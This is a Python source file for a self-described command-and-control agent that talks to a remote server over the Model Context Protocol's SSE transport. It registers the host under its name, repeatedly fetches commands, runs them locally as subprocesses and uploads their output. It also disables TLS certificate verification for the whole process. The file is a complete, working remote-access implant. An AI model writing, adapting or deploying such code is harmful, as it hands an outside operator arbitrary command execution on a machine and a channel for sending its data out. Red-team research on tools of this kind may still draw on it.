#!/usr/bin/env python3
"""
MCP C2 Agent
• Connects over SSE to an MCP C2 server
• Registers itself, polls for commands, executes them, and uploads results
• Usage: python agent.py --server-url https://<your-mcp-host> [--agent-id myagent]
"""
import argparse
import asyncio
import subprocess
import sys
import socket
import ssl
import json
import certifi

# Workaround for Homebrew certifi bug
if not hasattr(certifi, 'where'):
    certifi.where = lambda: ssl.get_default_verify_paths().cafile
# (Optional) Disable SSL verification if you don't have valid certs
ssl._create_default_https_context = ssl._create_unverified_context

from mcp.client.sse import sse_client
from mcp.client.session import ClientSession

async def call_tool_json(client, tool_name, params):
    """
    Calls an MCP tool and returns the parsed JSON/text result.
    """
    resp = await client.call_tool(tool_name, {'params': params})
    if hasattr(resp, 'content') and resp.content:
        txt = resp.content[0].text
        try:
            return json.loads(txt)
        except json.JSONDecodeError:
            return txt
    if isinstance(resp, dict):
        return resp
    return None

async def run_agent(server_url: str, agent_id: str):
    mcp_url = server_url.rstrip('/') + '/mcp'
    print(f"[i] Connecting to MCP SSE at {mcp_url}")

    # Establish SSE connection
    async with sse_client(mcp_url) as (read_stream, write_stream):
        async with ClientSession(read_stream, write_stream) as client:
            await client.initialize()

            # 1) Register this agent
            print(f"[i] Registering agent '{agent_id}'...")
            reg = await call_tool_json(client, 'register_agent', {'agent_id': agent_id})
            if not (isinstance(reg, dict) and reg.get('ok')):
                print(f"[!] Registration failed: {reg}", file=sys.stderr)
                return
            print(f"[+] Registered successfully (agent_id={agent_id})")

            # 2) Poll‑execute loop
            while True:
                try:
                    cmd = await call_tool_json(client, 'get_next_command', {'agent_id': agent_id})
                    if not isinstance(cmd, dict) or not cmd.get('command_id'):
                        await asyncio.sleep(2)
                        continue

                    cid = cmd['command_id']
                    exe = cmd.get('command', '')
                    args = cmd.get('args', []) or []
                    print(f"[→] Executing [{cid}]: {exe} {' '.join(args)}")

                    # Run the command
                    proc = await asyncio.create_subprocess_exec(
                        exe, *args,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE
                    )
                    out, err = await proc.communicate()
                    output = (out + err).decode(errors='ignore')

                    # Upload the result
                    res = await call_tool_json(client, 'upload_result', {
                        'agent_id': agent_id,
                        'command_id': cid,
                        'exit_code': proc.returncode,
                        'output': output
                    })
                    print(f"[✓] Uploaded result for {cid}: {res}")

                except Exception as e:
                    print(f"[!] Error in loop: {e}", file=sys.stderr)
                    await asyncio.sleep(5)

async def main():
    parser = argparse.ArgumentParser(description="MCP C2 Agent")
    parser.add_argument("--server-url", required=True,
                        help="Base URL of MCP server (e.g. https://abcd.ngrok.io)")
    parser.add_argument("--agent-id", default=None,
                        help="Agent ID to use (defaults to hostname)")
    args = parser.parse_args()

    agent_id = args.agent_id or socket.gethostname()
    await run_agent(args.server_url, agent_id)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[i] Agent stopped by user")

